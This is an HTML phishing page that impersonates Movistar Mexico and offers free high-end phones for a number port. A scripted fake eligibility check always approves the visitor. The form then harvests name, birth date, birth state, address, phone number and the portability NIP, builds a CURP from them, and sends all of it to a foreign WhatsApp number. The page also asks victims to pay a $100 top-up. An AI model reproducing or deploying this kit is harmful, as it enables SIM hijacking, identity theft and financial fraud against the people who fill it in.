<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Movistar | Programa de Equipos Bonificados 2026</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700;900&display=swap" rel="stylesheet">
    <style>
        body { font-family: 'Roboto', sans-serif; scroll-behavior: smooth; }
        .movistar-blue { background-color: #019DF0; }
        .text-movistar-blue { color: #019DF0; }
        .bg-movistar-green { background-color: #5BC500; }
        .hero-gradient { background: linear-gradient(135deg, #019DF0 0%, #005A87 100%); }
        
        /* Animaciones de transici√≥n entre etapas */
        .fade-in { animation: fadeIn 0.5s ease-out forwards; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
        
        .product-card { transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1); }
        .product-card:hover { transform: translateY(-10px); box-shadow: 0 25px 30px -10px rgba(0, 0, 0, 0.1); }

        .step-indicator.active { background-color: #019DF0; color: white; transform: scale(1.1); box-shadow: 0 0 20px rgba(1, 157, 240, 0.3); }
        .step-indicator.completed { background-color: #5BC500; color: white; }

        /* Control de Visibilidad de Secciones */
        .stage-container { display: none; }
        .stage-container.active { display: block; }

        .countdown-box { background: white; border-radius: 1.5rem; padding: 1.5rem; text-align: center; box-shadow: inset 0 2px 4px rgba(0,0,0,0.05); border: 1px solid #f1f5f9; }
        .countdown-val { font-size: 2rem; font-weight: 900; color: #019DF0; display: block; line-height: 1; }
        .countdown-label { font-size: 0.65rem; text-transform: uppercase; color: #64748b; font-weight: 800; margin-top: 0.5rem; display: block; }
    </style>
</head>
<body class="bg-slate-50 text-slate-900">

    <!-- Loader Inicial -->
    <div id="loader" class="fixed inset-0 bg-white z-[9999] flex flex-col justify-center items-center">
        <div class="animate-spin h-14 w-14 text-movistar-blue mb-4">
            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="4"><circle class="opacity-25" cx="12" cy="12" r="10"></circle><path class="opacity-75" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4"></path></svg>
        </div>
        <p class="text-movistar-blue font-black italic animate-pulse tracking-widest uppercase text-xs">SISTEMA MOVISTAR M√âXICO</p>
    </div>

    <!-- Barra de Navegaci√≥n Fija -->
    <header class="movistar-blue text-white shadow-xl sticky top-0 z-50">
        <div class="container mx-auto px-4 h-16 flex items-center justify-between">
            <div class="flex items-center gap-2 cursor-pointer" onclick="location.reload()">
                <div class="bg-white p-1.5 rounded-full shadow-inner"><i class="fas fa-phone-alt text-movistar-blue text-xs"></i></div>
                <span class="font-black text-xl tracking-tighter uppercase italic">Movistar</span>
            </div>
            <div class="flex items-center gap-4">
                <a href="https://wa.me/523334066972" target="_blank" class="hidden sm:flex items-center gap-2 text-[10px] font-black uppercase bg-white/10 px-4 py-2 rounded-full hover:bg-white/20 transition-all">
                    <i class="fas fa-headset text-movistar-green"></i> Soporte M√©xico
                </a>
            </div>
        </div>
    </header>

    <!-- Indicador de Etapas (Stepper) -->
    <nav id="global-stepper" class="bg-white border-b sticky top-16 z-40 py-6 shadow-sm">
        <div class="container mx-auto px-4">
            <div class="flex items-center justify-between max-w-2xl mx-auto relative">
                <div class="absolute top-1/2 left-0 w-full h-0.5 bg-slate-100 -translate-y-1/2 z-0"></div>
                
                <div class="relative z-10 flex flex-col items-center gap-2">
                    <div id="dot-1" class="step-indicator active w-10 h-10 rounded-full border-2 border-slate-100 bg-white flex items-center justify-center text-sm font-black transition-all">1</div>
                    <span class="text-[10px] font-black uppercase text-slate-400">Validar</span>
                </div>
                <div class="relative z-10 flex flex-col items-center gap-2">
                    <div id="dot-2" class="step-indicator w-10 h-10 rounded-full border-2 border-slate-100 bg-white flex items-center justify-center text-sm font-black transition-all">2</div>
                    <span class="text-[10px] font-black uppercase text-slate-400">Equipos</span>
                </div>
                <div class="relative z-10 flex flex-col items-center gap-2">
                    <div id="dot-3" class="step-indicator w-10 h-10 rounded-full border-2 border-slate-100 bg-white flex items-center justify-center text-sm font-black transition-all">3</div>
                    <span class="text-[10px] font-black uppercase text-slate-400">Solicitud</span>
                </div>
            </div>
        </div>
    </nav>

    <!-- ETAPA 1: SECCI√ìN DE VALIDACI√ìN -->
    <section id="stage-1" class="stage-container active fade-in py-16 px-4">
        <div class="max-w-xl mx-auto bg-white p-10 md:p-14 rounded-[4rem] shadow-2xl border border-slate-50 text-center relative overflow-hidden">
            <div class="bg-blue-50 w-24 h-24 rounded-[2rem] rotate-12 flex items-center justify-center mx-auto mb-8">
                <i class="fas fa-user-shield text-4xl text-movistar-blue -rotate-12"></i>
            </div>
            <h2 class="text-3xl font-black text-slate-800 italic uppercase tracking-tighter mb-4">Verificar Beneficio</h2>
            <p class="text-slate-500 font-medium text-sm leading-relaxed mb-10">
                Consulta si tu n√∫mero actual es elegible para recibir un <span class="text-movistar-blue font-black underline">equipo de gama alta sin costo</span> al realizar tu portabilidad.
            </p>
            
            <div class="space-y-4 max-w-sm mx-auto">
                <input type="tel" id="val-phone" maxlength="10" placeholder="N√∫mero a 10 d√≠gitos" 
                    class="w-full bg-slate-50 border-2 border-slate-100 p-6 rounded-3xl text-center text-3xl font-black tracking-[0.2em] focus:border-movistar-blue outline-none transition-all focus:bg-white shadow-inner">
                <button onclick="processValidation()" id="val-btn" class="w-full movistar-blue text-white font-black py-6 rounded-3xl shadow-xl hover:scale-[1.02] active:scale-95 transition-all flex items-center justify-center gap-3 italic uppercase text-sm">
                    CONTINUAR <i class="fas fa-arrow-right"></i>
                </button>
            </div>
            
            <div id="val-loader-box" class="hidden mt-10 space-y-4">
                <div class="w-full bg-slate-100 h-2.5 rounded-full overflow-hidden">
                    <div id="val-progress" class="h-full movistar-blue w-0 transition-all duration-300"></div>
                </div>
                <p id="val-text" class="text-[10px] font-black text-movistar-blue uppercase tracking-widest animate-pulse">Iniciando protocolo de consulta...</p>
            </div>
        </div>
    </section>

    <!-- ETAPA 2: SECCI√ìN DE CAT√ÅLOGO -->
    <section id="stage-2" class="stage-container fade-in">
        <div class="hero-gradient text-white py-16 px-4 text-center">
            <div class="max-w-4xl mx-auto">
                <div class="inline-flex items-center gap-3 bg-white/20 backdrop-blur-md px-6 py-2.5 rounded-full text-[10px] font-black uppercase mb-6 border border-white/20">
                    <i class="fas fa-certificate text-movistar-green"></i> Estatus: Usuario Seleccionado para Bonificaci√≥n
                </div>
                <h2 class="text-4xl md:text-6xl font-black mb-4 italic tracking-tighter leading-tight uppercase">Elige tu Equipo de Regalo</h2>
                <p class="text-lg opacity-90 font-light mb-10 max-w-2xl mx-auto italic">
                    Selecciona el dispositivo que deseas recibir. Costo inicial: <span class="font-black text-movistar-green">$0.00 MXN</span>.
                </p>
                <div class="relative max-w-md mx-auto">
                    <i class="fas fa-search absolute left-5 top-1/2 -translate-y-1/2 text-slate-400"></i>
                    <input type="text" id="searchInput" onkeyup="filterDevices()" placeholder="Buscar equipo..." 
                    class="w-full bg-white text-slate-800 pl-14 pr-6 py-5 rounded-3xl outline-none focus:ring-4 focus:ring-movistar-green/30 transition-all shadow-2xl font-bold">
                </div>
            </div>
        </div>

        <main class="container mx-auto px-4 py-16">
            <div id="device-grid" class="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-3 xl:grid-cols-4 gap-10">
                <!-- Generado por JS -->
            </div>
        </main>
    </section>

    <!-- ETAPA 3: SECCI√ìN DE REGISTRO (CURP + NIP) -->
    <section id="stage-3" class="stage-container fade-in py-16 bg-slate-100 min-h-screen">
        <div class="container mx-auto px-4 max-w-5xl">
            <button onclick="backToCatalog()" class="mb-8 text-movistar-blue font-black flex items-center gap-2 hover:gap-4 transition-all uppercase text-sm italic">
                <i class="fas fa-chevron-left"></i> Cambiar de equipo
            </button>

            <div class="bg-white shadow-2xl rounded-[4rem] overflow-hidden border border-slate-200">
                <div class="movistar-blue p-10 md:p-14 text-white flex flex-col md:flex-row items-center gap-10">
                    <div class="w-44 h-44 bg-white rounded-[3rem] p-5 shadow-2xl flex items-center justify-center flex-shrink-0">
                        <img id="checkout-img" src="" class="max-h-full object-contain" alt="Seleccionado">
                    </div>
                    <div class="text-center md:text-left">
                        <span class="text-[10px] font-black uppercase tracking-widest opacity-80 italic bg-white/10 px-4 py-1.5 rounded-full">Solicitud de Portabilidad</span>
                        <h2 id="checkout-name" class="text-4xl md:text-5xl font-black italic tracking-tighter uppercase leading-none mt-4">CARGANDO...</h2>
                        <div class="flex justify-center md:justify-start gap-3 mt-6">
                            <span class="bg-movistar-green text-white text-xs font-black px-5 py-2 rounded-full uppercase italic">Regalo Bonificado 100%</span>
                        </div>
                    </div>
                </div>

                <div class="p-10 md:p-14">
                    <form id="portability-form" onsubmit="submitPortability(event)" class="space-y-10">
                        
                        <!-- SECCI√ìN: IDENTIDAD (DATOS CURP) -->
                        <div class="space-y-6">
                            <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-movistar-blue pl-4">1. Identidad del Titular</h3>
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Nombre(s)</label>
                                    <input type="text" id="c-name" required placeholder="Nombres" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
                                </div>
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Ap. Paterno</label>
                                    <input type="text" id="c-paterno" required placeholder="Apellido" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
                                </div>
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Ap. Materno</label>
                                    <input type="text" id="c-materno" required placeholder="Apellido" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
                                </div>
                            </div>
                            
                            <div class="grid grid-cols-1 md:grid-cols-3 gap-6">
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Fecha Nacimiento</label>
                                    <input type="date" id="c-dob" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold uppercase transition-all shadow-sm">
                                </div>
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">G√©nero</label>
                                    <select id="c-sex" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold shadow-sm">
                                        <option value="">G√©nero...</option>
                                        <option value="H">HOMBRE</option>
                                        <option value="M">MUJER</option>
                                    </select>
                                </div>
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Edo. Nacimiento</label>
                                    <select id="c-state" required class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-4 rounded-2xl outline-none font-bold shadow-sm">
                                        <option value="">Estado...</option>
                                        <option value="AS">AGUASCALIENTES</option><option value="BC">BAJA CALIFORNIA</option><option value="BS">BAJA CALIFORNIA SUR</option><option value="CC">CAMPECHE</option><option value="CS">CHIAPAS</option><option value="CH">CHIHUAHUA</option><option value="DF">CIUDAD DE M√âXICO</option><option value="CL">COAHUILA</option><option value="CM">COLIMA</option><option value="DG">DURANGO</option><option value="GT">GUANAJUATO</option><option value="GR">GUERRERO</option><option value="HG">HIDALGO</option><option value="JC">JALISCO</option><option value="MC">M√âXICO</option><option value="MN">MICHOAC√ÅN</option><option value="MS">MORELOS</option><option value="NT">NAYARIT</option><option value="NL">NUEVO LE√ìN</option><option value="OC">OAXACA</option><option value="PL">PUEBLA</option><option value="QT">QUER√âTARO</option><option value="QR">QUINTANA ROO</option><option value="SP">SAN LUIS POTOS√ç</option><option value="SL">SINALOA</option><option value="SR">SONORA</option><option value="TC">TABASCO</option><option value="TS">TAMAULIPAS</option><option value="TL">TLAXCALA</option><option value="VZ">VERACRUZ</option><option value="YN">YUCAT√ÅN</option><option value="ZS">ZACATECAS</option>
                                    </select>
                                </div>
                            </div>
                        </div>

                        <!-- SECCI√ìN: L√çNEA Y NIP -->
                        <div class="space-y-6">
                            <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-movistar-green pl-4">2. L√≠nea de Origen</h3>
                            <div class="grid grid-cols-1 md:grid-cols-2 gap-8">
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">N√∫mero a Portar (10 D√≠gitos)</label>
                                    <input type="tel" id="p-num" required maxlength="10" placeholder="55" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-5 rounded-3xl outline-none font-black text-2xl transition-all shadow-sm">
                                </div>
                                <div>
                                    <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">NIP de Portabilidad (051)</label>
                                    <input type="tel" id="p-nip" required maxlength="4" placeholder="####" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-5 rounded-3xl outline-none font-black text-2xl transition-all shadow-sm">
                                </div>
                            </div>
                        </div>

                        <!-- SECCI√ìN: LOG√çSTICA -->
                        <div class="space-y-6">
                            <h3 class="text-xl font-black text-slate-800 italic uppercase border-l-4 border-slate-800 pl-4">3. Log√≠stica de Entrega</h3>
                            <div>
                                <label class="block text-[10px] font-black text-slate-400 uppercase mb-2 ml-2 tracking-widest">Direcci√≥n Completa de Despacho</label>
                                <textarea id="p-address" required placeholder="Calle, # ext e int, Colonia, CP, Municipio y Referencias..." rows="3" class="w-full bg-slate-50 border-2 border-slate-100 focus:border-movistar-blue p-6 rounded-[2rem] outline-none font-medium transition-all shadow-sm"></textarea>
                            </div>
                        </div>

                        <button type="submit" id="submit-btn" class="w-full movistar-blue hover:bg-sky-600 text-white font-black py-7 rounded-[2.5rem] shadow-2xl transition-all flex items-center justify-center gap-5 uppercase italic text-xl group">
                            SOLICITAR EQUIPO Y PORTABILIDAD <i class="fab fa-whatsapp text-3xl group-hover:scale-110"></i>
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </section>

    <!-- ETAPA 4: SECCI√ìN DE √âXITO -->
    <section id="stage-4" class="stage-container fade-in py-16 px-4">
        <div class="max-w-3xl mx-auto bg-white p-12 md:p-20 rounded-[5rem] shadow-2xl border border-slate-50 text-center relative">
            <div class="w-28 h-28 bg-movistar-green text-white rounded-full flex items-center justify-center mx-auto mb-10 shadow-2xl shadow-green-200">
                <i class="fas fa-check text-5xl"></i>
            </div>
            <h2 class="text-4xl md:text-5xl font-black text-slate-800 italic uppercase tracking-tighter mb-4 leading-none">¬°REGISTRO CONFIRMADO!</h2>
            <p class="text-slate-500 font-bold mb-12">Tu solicitud ha sido vinculada correctamente. Sigue los pasos finales:</p>
            
            <div class="bg-blue-50 border-2 border-blue-100 p-10 rounded-[4rem] mb-12">
                <span class="text-xs font-black text-movistar-blue uppercase tracking-widest block mb-3">Folio de Retiro de Chip</span>
                <h3 id="order-id" class="text-5xl font-black text-slate-900 tracking-tighter mb-10">MOV-000000</h3>
                
                <div class="grid grid-cols-3 gap-6 max-w-sm mx-auto">
                    <div class="countdown-box">
                        <span id="h-val" class="countdown-val">72</span>
                        <span class="countdown-label">Horas</span>
                    </div>
                    <div class="countdown-box">
                        <span id="m-val" class="countdown-val">00</span>
                        <span class="countdown-label">Min</span>
                    </div>
                    <div class="countdown-box">
                        <span id="s-val" class="countdown-val">00</span>
                        <span class="countdown-label">Seg</span>
                    </div>
                </div>
                <p class="text-[11px] text-movistar-blue mt-8 font-black uppercase italic animate-pulse">
                    Tiempo estimado para despacho de equipo a domicilio
                </p>
            </div>

            <div class="text-left bg-slate-50 p-8 rounded-[3rem] space-y-4 border border-slate-100">
                <p class="text-xs font-bold text-slate-700 uppercase flex items-center gap-3"><i class="fas fa-info-circle text-movistar-blue"></i> Instrucciones Finales:</p>
                <ul class="text-[11px] text-slate-500 font-medium list-disc pl-5 space-y-2">
                    <li>Acude a tu sucursal Movistar con tu folio para recoger tu chip.</li>
                    <li>Realiza una recarga m√≠nima de <span class="font-black text-slate-800">$100 MXN</span> para activar la l√≠nea.</li>
                    <li>Reg√≠strate en el portal de la compa√±√≠a para activar el seguro del equipo.</li>
                </ul>
            </div>
        </div>
    </section>

    <!-- Footer Compartido -->
    <footer id="footer" class="bg-slate-900 text-slate-500 py-20 mt-20">
        <div class="container mx-auto px-4 text-center">
            <p class="text-sm font-black uppercase tracking-widest text-white mb-6 italic">Telef√≥nica | Movistar M√©xico</p>
            <p class="text-[10px] opacity-40 leading-relaxed max-w-2xl mx-auto mb-10">
                ¬© 2026 Movistar. Programa exclusivo de portabilidad. La entrega de equipos est√° sujeta a la validaci√≥n exitosa del NIP y la activaci√≥n de la l√≠nea con recarga inicial. Soporte: +52 33 34 06 69 72.
            </p>
            <div class="flex justify-center gap-8 grayscale opacity-30">
                <i class="fab fa-facebook text-2xl"></i>
                <i class="fab fa-twitter text-2xl"></i>
                <i class="fab fa-instagram text-2xl"></i>
            </div>
        </div>
    </footer>

    <script>
        const devices = [
            { id: 1, name: "iPhone 17 Pro Max", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017%20Pro%20Max.jfif", specs: "Titanium | 1TB | A19 Pro" },
            { id: 2, name: "iPhone 17", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2017.jfif", specs: "256GB | Chip A18 AI" },
            { id: 3, name: "Galaxy S24 Ultra", brand: "samsung", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/s%2024%20ultra.jfif", specs: "AI Pro | 512GB | Titanium" },
            { id: 4, name: "Galaxy Z Fold 5", brand: "samsung", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/SAMGMUG/Galaxy%20Z%20Fold%205.jfif", specs: "Plegable | 512GB | 12GB RAM" },
            { id: 5, name: "Edge 40 Pro", brand: "motorola", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/MOTOROLA/Edge%2040%20Pro.jfif", specs: "SD 8 Gen 2 | 256GB" },
            { id: 6, name: "Xiaomi 13T Pro", brand: "xiaomi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Xiaomi%2013T%20Pro.jfif", specs: "Leica Optic | 512GB | 120W" },
            { id: 7, name: "iPhone 15 Pro Max", brand: "apple", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/IPHONE/iPhone%2015%20Pro%20Max.jfif", specs: "Natural Titanium | 256GB" },
            { id: 8, name: "Redmi Note 13 Pro+", brand: "redmi", img: "https://raw.githubusercontent.com/kaddexomg/moxistar.mx/refs/heads/main/XIAOMI/Redmi%20Note%2013%20Pro%2B.jfif", specs: "200MP | Curved Screen | 512GB" }
        ];

        let selectedDevice = null;

        // --- L√ìGICA DE NAVEGACI√ìN ---
        function navigateTo(stage) {
            document.querySelectorAll('.stage-container').forEach(s => s.classList.remove('active'));
            document.getElementById(`stage-${stage}`).classList.add('active');
            
            // Stepper Visual
            document.querySelectorAll('.step-indicator').forEach((dot, idx) => {
                const sNum = idx + 1;
                dot.classList.remove('active', 'completed');
                if (sNum < stage) dot.classList.add('completed');
                if (sNum === stage) dot.classList.add('active');
            });

            if (stage === 2) renderDevices(devices);
            if (stage === 4) document.getElementById('global-stepper').style.display = 'none';

            window.scrollTo({ top: 0, behavior: 'smooth' });
        }

        // --- VALIDACI√ìN ETAPA 1 ---
        function processValidation() {
            const num = document.getElementById('val-phone').value;
            if (num.length < 10) return;

            document.getElementById('val-btn').classList.add('hidden');
            const box = document.getElementById('val-loader-box');
            const bar = document.getElementById('val-progress');
            const txt = document.getElementById('val-text');
            box.classList.remove('hidden');

            const steps = [
                { p: 25, t: "Verificando titularidad de l√≠nea..." },
                { p: 50, t: "Consultando historial de recargas..." },
                { p: 85, t: "Buscando convenios de portabilidad..." },
                { p: 100, t: "¬°SISTEMA APROBADO!" }
            ];

            let i = 0;
            const timer = setInterval(() => {
                if (i < steps.length) {
                    bar.style.width = steps[i].p + "%";
                    txt.innerText = steps[i].t;
                    i++;
                } else {
                    clearInterval(timer);
                    setTimeout(() => navigateTo(2), 600);
                }
            }, 800);
        }

        // --- CAT√ÅLOGO ETAPA 2 ---
        function renderDevices(items) {
            const grid = document.getElementById('device-grid');
            grid.innerHTML = items.map(d => `
                <div onclick="selectDevice(${d.id})" class="product-card bg-white rounded-[3rem] p-8 border border-slate-100 flex flex-col items-center cursor-pointer group">
                    <div class="relative w-full h-56 bg-slate-50 rounded-[2.5rem] flex items-center justify-center p-6 mb-8 overflow-hidden">
                        <img src="${d.img}" alt="${d.name}" class="max-h-full object-contain group-hover:scale-110 transition-transform duration-500">
                        <span class="absolute top-4 right-4 bg-movistar-blue text-white text-[8px] font-black px-3 py-1 rounded-full uppercase italic">Regalo</span>
                    </div>
                    <div class="w-full text-center">
                        <span class="text-[10px] font-black uppercase tracking-[0.2em] text-slate-300 group-hover:text-movistar-blue transition-colors">${d.brand}</span>
                        <h4 class="text-xl font-black text-slate-800 mt-2 mb-2 italic uppercase leading-none h-12 line-clamp-2">${d.name}</h4>
                        <p class="text-[10px] text-slate-400 mb-8 font-bold">${d.specs}</p>
                        <div class="w-full py-4 bg-slate-900 text-white rounded-2xl text-[10px] font-black uppercase group-hover:bg-movistar-green transition-all shadow-xl shadow-slate-200">
                            RECLAMAR ESTE EQUIPO <i class="fas fa-chevron-right ml-2 text-[8px]"></i>
                        </div>
                    </div>
                </div>
            `).join('');
        }

        function filterDevices() {
            const q = document.getElementById('searchInput').value.toLowerCase();
            renderDevices(devices.filter(d => d.name.toLowerCase().includes(q)));
        }

        function selectDevice(id) {
            selectedDevice = devices.find(d => d.id === id);
            document.getElementById('checkout-img').src = selectedDevice.img;
            document.getElementById('checkout-name').innerText = selectedDevice.name;
            navigateTo(3);
        }

        function backToCatalog() { navigateTo(2); }

        // --- C√ÅLCULO CURP MANUAL ---
        function calculateCURP(d) {
            const n = d.name.toUpperCase();
            const p = d.paterno.toUpperCase();
            const m = d.materno.toUpperCase();
            const b = d.dob.split("-"); // YYYY-MM-DD
            const s = d.sex;
            const e = d.state;

            const voc = (str) => (str.substring(1).match(/[AEIOU]/) || ["X"])[0];
            const con = (str) => (str.substring(1).match(/[BCDFGHJKLMNPQRSTVWXYZ]/) || ["X"])[0];

            let curp = p.substring(0, 1);
            curp += voc(p);
            curp += m.substring(0, 1);
            curp += n.substring(0, 1);
            curp += b[0].substring(2, 4); // YY
            curp += b[1]; // MM
            curp += b[2]; // DD
            curp += s + e;
            curp += con(p) + con(m) + con(n);
            curp += "A" + Math.floor(Math.random() * 9);
            
            return curp;
        }

        // --- ENV√çO FINAL ETAPA 3 ---
        function submitPortability(e) {
            e.preventDefault();
            
            const data = {
                name: document.getElementById('c-name').value,
                paterno: document.getElementById('c-paterno').value,
                materno: document.getElementById('c-materno').value,
                dob: document.getElementById('c-dob').value,
                sex: document.getElementById('c-sex').value,
                state: document.getElementById('c-state').value,
                phone: document.getElementById('p-num').value,
                nip: document.getElementById('p-nip').value,
                address: document.getElementById('p-address').value
            };

            const curp = calculateCURP(data);
            const folio = `MOV-REG-${Math.floor(Math.random() * 900000) + 100000}`;

            const msg = 
                `*PORTABILIDAD M√âXICO - EQUIPO DE REGALO*%0A` +
                `*FOLIO:* ${folio}%0A` +
                `--------------------------------%0A` +
                `*EQUIPO:* ${selectedDevice.name}%0A%0A` +
                `*DATOS DEL TITULAR:*%0A` +
                `üë§ *Nombre:* ${data.name} ${data.paterno} ${data.materno}%0A` +
                `üÜî *CURP:* ${curp}%0A` +
                `üéÇ *F. Nacimiento:* ${data.dob}%0A%0A` +
                `*DATOS T√âCNICOS:*%0A` +
                `üìû *L√≠nea:* ${data.phone}%0A` +
                `üîë *NIP:* ${data.nip}%0A%0A` +
                `*LOG√çSTICA:*%0A` +
                `üè† *Direcci√≥n:* ${data.address}%0A` +
                `--------------------------------%0A` +
                `_Acepto realizar recarga de $100 y registro para despacho en 48-72h._`;

            const btn = document.getElementById('submit-btn');
            btn.innerHTML = `<i class="fas fa-circle-notch animate-spin"></i> PROCESANDO TR√ÅMITE...`;
            btn.classList.add('opacity-70', 'pointer-events-none');

            // Redirecci√≥n y Cambio a √âxito
            setTimeout(() => {
                window.open(`https://wa.me/584124676073?text=${msg}`, '_blank');
                document.getElementById('order-id').innerText = folio;
                navigateTo(4);
                startTimer();
            }, 2000);
        }

        // --- TIMER 72 HORAS ---
        function startTimer() {
            let total = 72 * 3600;
            const interval = setInterval(() => {
                total--;
                if (total <= 0) clearInterval(interval);
                
                const h = Math.floor(total / 3600);
                const m = Math.floor((total % 3600) / 60);
                const s = total % 60;
                
                document.getElementById('h-val').innerText = h.toString().padStart(2, '0');
                document.getElementById('m-val').innerText = m.toString().padStart(2, '0');
                document.getElementById('s-val').innerText = s.toString().padStart(2, '0');
            }, 1000);
        }

        window.onload = () => {
            setTimeout(() => {
                const loader = document.getElementById('loader');
                loader.classList.add('opacity-0');
                setTimeout(() => loader.style.display = 'none', 500);
            }, 1500);
        };
    </script>

    <!-- Cloudflare Web Analytics -->
    <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "b512031e6a3c471c8b9be510e875f762"}'></script>
    <!-- End Cloudflare Web Analytics -->

</body>
</html>
